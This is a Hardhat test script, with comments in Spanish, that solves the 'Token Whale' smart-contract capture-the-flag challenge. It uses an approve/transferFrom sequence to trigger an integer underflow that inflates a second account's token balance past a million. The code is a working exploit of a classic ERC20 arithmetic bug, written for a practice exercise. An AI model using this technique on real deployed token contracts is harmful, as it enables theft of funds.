import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";

let tokenWhaleContract: Contract;
let cuenta2Contract: Contract;
const challengeAddress: string = "0xeA3ba03A26C73aaf5fc31B51d72f2A2b1D1aFED6";
let accounts: Signer[];
let cuenta1: Signer;
let cuenta2: Signer;
let cuenta3: Signer;


beforeEach(async () => {
  accounts = await ethers.getSigners();
  [cuenta1, cuenta2, cuenta3] = accounts.slice(0,3);

  const tokenWhaleFactory = await ethers.getContractFactory("TokenWhaleChallenge");
  tokenWhaleContract = tokenWhaleFactory.attach(challengeAddress);
  cuenta2Contract = tokenWhaleContract.connect(cuenta2); //Para poder invocar funciones del contrato desde otra address, se le asocia el signer de la cuenta 2 de hardhat.

})

describe("Token Whale", async () => {
  it("Resuelve el Math challenge - Token Whale", async () => {
    
    const cuenta1Address = await cuenta1.getAddress();
    const cuenta2Address = await cuenta2.getAddress();
    const cuenta3Address = await cuenta3.getAddress();
    
    console.log("APROBANDO CUENTA 2 PARA QUE UTILICE LOS FONDOS DE CUENTA 1...");
    await tokenWhaleContract.approve(cuenta2Address, 100, { gasLimit: 1e5 });
    const permitido = await tokenWhaleContract.allowance(cuenta1Address,cuenta2Address);
    expect(permitido == 100, "El permitido de cuenta 2 no fue modificado");

    console.log("CUENTA 2 COMIENZA transferFrom (A,C,1)");
    await cuenta2Contract.transferFrom(cuenta1Address, cuenta3Address, 1, { gasLimit: 1e5 });
    const balanceCuenta2 = await tokenWhaleContract.balanceOf(cuenta2Address);
    expect(balanceCuenta2 > 1000000, "El balance de cuenta 2 no fue aumentado");

    console.log("CUENTA 2 COMIENZA A TRANSFERIR A CUENTA 1 UN MILLON DE TOKENS");
    await cuenta2Contract.transfer(cuenta1Address, 1000000, { gasLimit: 1e5 });
    const balanceCuenta1 = await tokenWhaleContract.balanceOf(cuenta1Address);
    expect(balanceCuenta1 > 1000000, "El balance de cuenta 1 no supera el millon");

    console.log("COMPROBANDO DESAFIO RESUELTO...");

    const isComplete = await tokenWhaleContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
    
  })
})